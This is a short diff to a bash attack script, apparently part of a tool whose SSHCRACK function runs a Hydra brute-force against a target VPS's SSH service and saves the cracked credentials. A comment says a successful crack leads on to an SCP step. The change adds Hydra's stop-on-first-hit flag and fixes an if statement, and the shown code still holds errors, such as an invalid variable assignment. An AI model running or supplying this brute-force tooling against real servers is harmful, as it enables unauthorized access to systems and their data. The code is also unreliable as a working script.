@@ -142,10 +142,12 @@ function SSHCRACK()
 	### BRUTE-FORCE ATTACK
 	echo "[*] Executing Hydra Brute-Force Attack via SSH protocol..."  
 	echo " "
-	sudo hydra -L $WordList -P $WordList $vpsip ssh -t 4 -vV > crackedusers.txt
+	sudo hydra -f -L $WordList -P $WordList $vpsip ssh -t 4 -vV > crackedusers.txt
 	# if attack succeeds, select cracked user and call the SCP function
 	crackstatus = $(cat crackedusers.txt | grep host: | awk '{print $2}')
+	
 	if [ "$crackstatus" == "host:" ]
+	then
 		### DISPLAY OF CRACKED USERS
 		# let user know about the number and details of cracked users to choose from
 		echo "[+] Attack successful:"
